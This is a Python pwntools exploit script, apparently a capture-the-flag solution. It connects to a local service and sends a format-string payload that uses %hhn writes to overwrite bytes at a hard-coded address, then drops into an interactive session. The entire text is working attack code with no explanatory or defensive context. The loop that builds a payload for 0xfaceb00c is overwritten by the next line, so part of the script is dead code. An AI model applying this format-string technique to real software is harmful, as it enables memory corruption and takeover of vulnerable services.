from pwn import *

host = '127.0.0.1'
port = 8888

r = remote(host, port)

magic = 0x60106c


def fmt(prev, val, idx):
    result = ''
    if prev < val:
        result += '%' + str(val - prev) + 'c'
    elif prev == val:
        result += ''
    else:
        result += '%' + str(val - prev + 256) + 'c'
    result += '%' + str(idx) + '$hhn'
    result = bytes(result, 'utf-8')
    return result


r.recvuntil(':')

target = 0xfaceb00c
prev = 0
payload = b''
for i in range(4):
    payload += fmt(prev, (target >> i*8) & 0xff, 22+i)
    prev = (target >> i*8) & 0xff

payload = fmt(0, 0xda, 22)
payload = payload.ljust(0x80, b'a') + p64(magic) + p64(magic+1) + p64(magic+2) + p64(magic+3)

r.sendline(payload)
r.interactive()
